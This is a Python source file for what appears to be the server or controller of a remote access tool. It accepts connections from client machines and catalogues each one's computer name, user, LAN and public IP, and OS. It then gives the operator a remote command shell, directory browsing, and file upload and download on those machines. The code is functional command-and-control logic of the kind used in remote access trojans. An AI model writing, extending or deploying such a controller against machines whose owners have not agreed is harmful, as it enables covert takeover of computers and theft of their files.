import _thread
import socket
import time
from socketsr import *


class SocketServer:
    def __init__(self, listenIp='127.0.0.1', listenPort=80, statusBarSignal=None, insertRowSignal=None,
                 deleteRowSignal=None):
        self.listenIp = listenIp
        self.listenPort = listenPort
        self.statusBarSignal = statusBarSignal
        self.insertRowSignal = insertRowSignal
        self.deleteRowSignal = deleteRowSignal

        self.showFileManagerUiSignal = None
        self.showCmdUiSignal = None
        self.id = 0
        self.clientAll = []
        self.cmdAll = []
        self.fileManagerAll = []


    def listenServer(self):
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientSocket = None
        address = None
        try:
            serverSocket.bind((self.listenIp, self.listenPort))
            serverSocket.listen(10)
            self.statusBarSignal.emit(f"Listening: {self.listenIp}:{self.listenPort}", 3)
            while True:
                try:
                    clientSocket, address = serverSocket.accept()
                except Exception as e:
                    print(e)

                if clientSocket:
                    self.statusBarSignal.emit('some one connecting...', 2)
                    _thread.start_new_thread(self.getClientInfo, (clientSocket, address))
                    clientSocket = None
                    address = None

        except Exception as e:
            print(e)
            return

    def getClientInfo(self, clientSocket, address):
        infoDate = {}
        while True:
            try:
                # dateLen = recvAll(clientSocket, 4)
                # dateLen = struct.unpack('>I', dateLen)[0]
                # date = recvAll(clientSocket, dateLen)
                # date = str(date, encoding='gbk')
                data = receiveData(clientSocket)
                if 'systeminfo' in data:
                    data = data.split(':')
                    infoDate['id'] = self.id
                    infoDate['computerName'] = data[1]
                    infoDate['UserName'] = data[2]
                    infoDate['Lan'] = data[3]
                    infoDate['Wan'] = address[0]
                    infoDate['OS'] = data[4]
                    self.insertRowSignal.emit(infoDate)
                    clientInfo = (self.id, clientSocket, address)
                    self.clientAll.append(clientInfo)
                    self.id += 1
                    self.statusBarSignal.emit(f"[+] New successful connection from {address}", 1)

                if 'cmdInfo' in data:
                    data = data.split(':')
                    cmdId = data[1]
                    cmdInfo = (cmdId, clientSocket, address)
                    self.cmdAll.append(cmdInfo)
                    self.statusBarSignal.emit('open cmd...', 2)
                    self.showCmdUiSignal.emit(int(cmdId))
                    break

                if 'fileManager' in data:
                    data = data.split(':')
                    fileManagerId = data[1]
                    fileManagerInfo = (fileManagerId, clientSocket, address)
                    self.fileManagerAll.append(fileManagerInfo)
                    self.statusBarSignal.emit('open filemanager...', 2)
                    self.showFileManagerUiSignal.emit(int(fileManagerId))
                    break

            except Exception as e:
                print(e)
                if '10054' in str(e):
                    clientSocket.close()
                    self.deleteRowSignal.emit(infoDate['id'])
                    self.statusBarSignal.emit(f"{infoDate['computerName']} closed", 2)
                    break

    def sendCmd(self, clientId, cmdId, showCmdUiSignal):
        for _clientAll in self.clientAll:
            if _clientAll[0] == int(clientId):
                data = f'cmd:{cmdId}'
                try:
                    # data = struct.pack('>I', len(date)) + date
                    # _clientAll[1].send(data)
                    sendData(_clientAll[1], data)
                    self.showCmdUiSignal = showCmdUiSignal
                except Exception as e:
                    print(e)
                break

    def sendCommand(self, cmdId, command, commandResultSignal):
        for _cmdAll in self.cmdAll:
            if _cmdAll[0] == str(cmdId):
                # command = struct.pack('>I', len(command)) + command
                # _cmdAll[1].send(command)
                sendData(_cmdAll[1], command)
                time.sleep(1)

                # cmdResultLen = recvAll(_cmdAll[1], 4)
                # dateLen = struct.unpack('>I', cmdResultLen)[0]
                # date = recvAll(_cmdAll[1], dateLen)
                # date = str(date, encoding='gbk')
                data = receiveData(_cmdAll[1])
                commandResultSignal.emit(data)
                break

    def sendFileManager(self, clientId, fileManagerId, showFileManagerUiSignal):
        for _clientAll in self.clientAll:
            if _clientAll[0] == int(clientId):
                data = f'fileManager:{fileManagerId}'
                try:
                    sendData(_clientAll[1], data)
                    self.showFileManagerUiSignal = showFileManagerUiSignal
                except Exception as e:
                    print(e)
                break

    def sendPath(self, fileManagerId, path, dirResultSignal):
        for _fileManagerAll in self.fileManagerAll:
            if _fileManagerAll[0] == str(fileManagerId):
                sendData(_fileManagerAll[1], path)
                time.sleep(1)
                data = receiveData(_fileManagerAll[1])
                dirResultSignal.emit(data)
                break

    def uploadFile(self, fileManagerId, uploadFileName, savePath, statusBarShowSignal):
        for _fileManagerAll in self.fileManagerAll:
            if _fileManagerAll[0] == str(fileManagerId):
                savePath = os.path.join(savePath, os.path.basename(uploadFileName))
                uploadFile(_fileManagerAll[1], uploadFileName, savePath, statusBarShowSignal)

    def downFile(self, fileManagerId, remoteFilePath, savePath, statusBarShowSignal):
        for _fileManagerAll in self.fileManagerAll:
            if _fileManagerAll[0] == str(fileManagerId):
                downFile(_fileManagerAll[1], remoteFilePath, savePath, statusBarShowSignal)

    def closeCmdSocket(self, cmdId):
        for _cmdAll in self.cmdAll:
            if _cmdAll[0] == str(cmdId):
                _cmdAll[1].close()
                break

    def closeFileManagerSocket(self, fileManagerId):
        for _fileManagerAll in self.fileManagerAll:
            if _fileManagerAll[0] == str(fileManagerId):
                _fileManagerAll[1].close()
                break
